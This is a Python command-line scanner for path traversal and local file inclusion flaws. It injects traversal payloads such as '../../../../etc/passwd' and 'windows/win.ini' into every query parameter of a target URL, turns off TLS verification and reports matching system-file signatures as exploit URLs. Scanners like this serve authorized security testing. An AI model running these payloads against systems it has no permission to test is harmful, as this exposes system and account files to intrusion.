import requests
import argparse
import sys
import urllib3
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Classic LFI verification signatures in response bodies
LFI_SIGNATURES = [
    "root:x:0:0:",          # Linux /etc/passwd signature
    "[extensions]",         # Windows win.ini signature
    "[fonts]",              # Windows win.ini signature
    "sbin/nologin",
    "bin/bash"
]

def scan_lfi(target_url):
    print("-" * 60)
    print(f"[*] Scanning parameters for Path Traversal / LFI: {target_url}")
    print("-" * 60)
    
    parsed_url = urlparse(target_url)
    query_params = parse_qs(parsed_url.query)
    
    if not query_params:
        print("[-] No query parameters found in URL. Skipping LFI scan.")
        print("-" * 60)
        return

    # Traversal payloads targeting Linux and Windows
    lfi_payloads = [
        "../../../../etc/passwd",
        "/etc/passwd",
        "..%2f..%2f..%2f..%2fetc%2fpasswd",
        "../../../../windows/win.ini",
        "..\\..\\..\\..\\windows\\win.ini"
    ]
    
    vulnerable = False
    
    for param in query_params:
        print(f"[*] Testing parameter for file inclusion: '{param}'")
        
        for payload in lfi_payloads:
            test_params = query_params.copy()
            test_params[param] = [payload]
            new_query = urlencode(test_params, doseq=True)
            lfi_url = urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, parsed_url.params, new_query, parsed_url.fragment))
            
            try:
                resp = requests.get(lfi_url, timeout=5, verify=False, headers={"User-Agent": "Mozilla/5.0"})
                body = resp.text
                
                for sig in LFI_SIGNATURES:
                    if sig in body:
                        print(f"  [!] CRITICAL: LFI / PATH TRAVERSAL VULNERABILITY FOUND in parameter '{param}'!")
                        print(f"      Matched system signature: '{sig}'")
                        print(f"      Exploit Payload URL: {lfi_url}")
                        vulnerable = True
                        break
                if vulnerable:
                    break
            except Exception:
                continue

    if not vulnerable:
        print("[-] No obvious LFI or path traversal vulnerabilities detected.")
    print("-" * 60)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Path Traversal & Local File Inclusion (LFI) Scanner")
    parser.add_argument("url", help="Target URL with parameters (e.g., http://example.com/page.php?file=home)")
    
    args = parser.parse_args()
    scan_lfi(args.url)
